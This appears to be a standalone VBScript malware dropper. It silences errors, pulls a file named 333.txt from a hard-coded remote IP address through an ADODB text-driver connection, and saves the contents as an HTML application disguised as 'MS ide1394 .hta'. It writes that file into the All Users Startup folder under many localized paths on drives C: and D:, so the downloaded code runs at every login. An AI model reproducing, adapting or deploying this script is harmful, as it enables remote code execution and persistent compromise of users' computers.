on error resume next
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://69.50.163.254;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from 333.txt"
set rs = Conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from 333.txt", Conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Menu Inicio\Programas\Inicio\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Menuen Start\Programmer\Start\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Menu Start\Programma's\Opstarten\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Menu Start\Programy\Autostart\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Kaynnista-valikko\Ohjelmat\Kaynnistys\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programlar\BASLANGIC\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Start-meny\Programmer\Oppstart\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Start-menyn\Program\Autostart\MS ide1394 .hta", adPersistXML
rs.Save "C:\Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\MS ide1394 .hta", adPersistXML
rs.Save "C:\Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Start Menu\Programs\Startup\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Menu Inicio\Programas\Inicio\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Menuen Start\Programmer\Start\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Menu Start\Programma's\Opstarten\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Menu Start\Programy\Autostart\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Kaynnista-valikko\Ohjelmat\Kaynnistys\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Start Menu\Programlar\BASLANGIC\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Start-meny\Programmer\Oppstart\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Start-menyn\Program\Autostart\MS ide1394 .hta", adPersistXML
rs.Save "D:\Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\MS ide1394 .hta", adPersistXML
rs.Save "D:\Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\MS ide1394 .hta", adPersistXML
rs.close
Conn.close
